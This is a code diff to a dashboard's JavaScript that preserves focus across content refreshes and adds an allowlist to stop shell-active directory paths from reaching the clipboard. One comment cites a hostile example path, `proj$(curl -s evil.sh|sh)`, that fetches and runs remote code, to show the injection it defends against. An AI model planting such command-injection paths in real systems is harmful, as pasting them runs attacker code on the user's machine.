@@ -497,6 +497,31 @@
       }
     }
 
+    // Replacing #content wholesale detaches everything inside it. That was free
+    // until the roster grew a focusable control: a keyboard user who has tabbed
+    // to a copy button loses focus to <body> on the next signature change (WCAG
+    // 2.4.3), and a button mid-flash is replaced by a fresh one showing nothing.
+    // So carry focus across the swap by the button's stable data-cwd key, and
+    // tell the copy handler to let go of any flash it is holding on a node that
+    // is about to be detached.
+    //
+    // The matching button is found by scanning rather than by building a
+    // selector: data-cwd is a filesystem path and may contain quotes or
+    // brackets, and CSS.escape — the only correct way to quote it — is absent on
+    // older engines. A roster is a handful of rows; the scan is free.
+    function swapContent(html) {
+      var active = document.activeElement;
+      var keep = active && active.closest ? active.closest('#content .copycwd') : null;
+      var key = keep ? keep.getAttribute('data-cwd') : null;
+      try { document.dispatchEvent(new CustomEvent('ch:contentswap')); } catch (e) {}
+      document.getElementById('content').innerHTML = html;
+      if (key === null) return;
+      var btns = document.querySelectorAll('#content .copycwd');
+      for (var i = 0; i < btns.length; i++) {
+        if (btns[i].getAttribute('data-cwd') === key) { btns[i].focus(); return; }
+      }
+    }
+
     if (refresh > 0) {
       // Idle is shown in minutes once past 60s, so a 30s cadence keeps the
       // displayed value within ~30s of true without per-second churn.
@@ -507,7 +532,7 @@
           .then(function (d) {
             if (d.signature !== sig) {
               sig = d.signature;
-              document.getElementById('content').innerHTML = d.html;
+              swapContent(d.html);
               tickIdle();
             }
           })
@@ -630,18 +655,60 @@
     // parser hands it back intact, so a crafted cwd could put a newline-
     // terminated shell command on the clipboard of someone about to paste into
     // a terminal. A real path contains no control characters.
-    //
-    // unusable() is the other half: a path that is not a path. The scrub layer
-    // fails closed, so a real segment shaped like a credential (…/api-key=v1/…)
-    // comes back as «redacted»; a value long enough to hit the length cap comes
-    // back with a trailing …. The stored cwd is capped at PATH_MAX so the second
-    // should not happen, but both yield a directory that does not exist. Writing
-    // that to the clipboard hands the operator a broken path they will not
-    // notice until it fails in a terminal, so refuse and say why instead.
-    function unusable(s) {
-      return s.indexOf('«redacted»') !== -1 || s.charAt(s.length - 1) === '…';
-    }
     function clean(s) { return s.replace(/[\u0000-\u001F\u007F-\u009F]/g, ''); }
+
+    // The allowlist a path must satisfy before it may reach the clipboard. It
+    // matches the FIRST character that is NOT allowed, so a match means refuse.
+    //
+    // An allowlist, not a denylist, mirroring the scrub layer's fail-closed
+    // bias: this button exists so you do not have to read the path, so nothing
+    // that could act when pasted after `cd ` may ride along. A directory named
+    // `proj$(curl -s evil.sh|sh)` takes no code execution to create — an
+    // unpacked archive or a package postinstall will do — and $, `, ;, |, &,
+    // (, ), <, > are all legal in a POSIX name and none is a control character,
+    // so stripping control characters at ingest does not touch them.
+    //
+    // Permitted: Unicode letters, marks and digits, so accented and CJK
+    // directory names copy normally; the space, because ~/Library/Application
+    // Support is ordinary and entirely safe to paste; and the punctuation real
+    // paths are built from: - / . _ + = , : @ ~ %. Everything else refuses.
+    var pathAllow;
+    try {
+      pathAllow = new RegExp('[^-\\p{L}\\p{M}\\p{N} /._+=,:@~%]', 'u');
+    } catch (e) {
+      // An engine without Unicode property escapes (pre-2018). Permit every
+      // non-ASCII code point rather than enumerate the letter categories: no
+      // shell-active character lives above U+007F, so every character the
+      // refusal exists for is still refused.
+      pathAllow = new RegExp('[^-A-Za-z0-9 /._+=,:@~%\\u0080-\\uFFFF]');
+    }
+
+    // Why this stored cwd is unfit to copy, or null if it is fine. Three
+    // distinct causes, so three distinct messages: telling someone their path
+    // held a secret when it was merely too long is its own small lie.
+    //
+    // 'redacted'  — the scrub layer fails closed, so a genuine segment shaped
+    //   like a credential (…/api-key=v1/…) comes back as «redacted».
+    // 'truncated' — the value hit the length cap and came back with a trailing
+    //   …. Reachable mainly through rows written before cwd got its own
+    //   PATH_MAX-sized cap; new writes are bounded below it (see maxPathLen in
+    //   scrub.go).
+    // 'unsafe'    — see pathAllow above.
+    //
+    // The first two name a directory that does not exist; the third names one
+    // that may do something. Either way, refuse and say which, rather than hand
+    // over a path whose problem only shows up once it has been pasted.
+    function unusableReason(s) {
+      if (s.indexOf('«redacted»') !== -1) return 'redacted';
+      if (s.charAt(s.length - 1) === '…') return 'truncated';
+      if (pathAllow.test(s)) return 'unsafe';
+      return null;
+    }
+    var unusableMsg = {
+      redacted: 'part of this path was redacted — not copied',
+      truncated: 'this path was too long and got cut off — not copied',
+      unsafe: 'this path contains shell characters — not copied'
+    };
 
     // Pre-secure-context fallback: select an off-screen textarea and let the
     // document copy command take it.
@@ -666,16 +733,33 @@
       return ok;
     }
 
+    // The poller replaces #content wholesale, so a button holding the flash can
+    // be detached mid-window. Let go of it there rather than let the timeout
+    // fire against a node that is no longer in the document.
+    document.addEventListener('ch:contentswap', unflash);
+
     document.addEventListener('click', function (ev) {
       var btn = ev.target && ev.target.closest ? ev.target.closest('.copycwd') : null;
       if (!btn) return;
       // A click that ends a drag-selection of the branch name is not a copy
-      // request; the button is selectable text first, a control second.
-      try { if (String(window.getSelection() || '')) return; } catch (e) {}
+      // request; the button is selectable text first, a control second. Scoped
+      // to mouse activation (detail 0 means keyboard) and to a selection that
+      // actually covers THIS button: pressing Enter on a focused button does not
+      // collapse a selection made earlier elsewhere on the page, so a
+      // document-wide guard would silently no-op the copy — no flash, no
+      // announcement — for exactly the keyboard and screen-reader users the
+      // button, its aria-label and the live region were added for.
+      if (ev.detail !== 0) {
+        try {
+          var sel = window.getSelection();
+          if (sel && String(sel) && sel.containsNode && sel.containsNode(btn, true)) return;
+        } catch (e) {}
+      }
       var path = clean(btn.getAttribute('data-cwd') || '');
       if (!path) return;
-      if (unusable(path)) {
-        flash(btn, false, 'path was redacted — not copied');
+      var why = unusableReason(path);
+      if (why) {
+        flash(btn, false, unusableMsg[why]);
         return;
       }
       function done(ok) { flash(btn, ok, (ok ? 'copied ' : 'could not copy ') + path); }
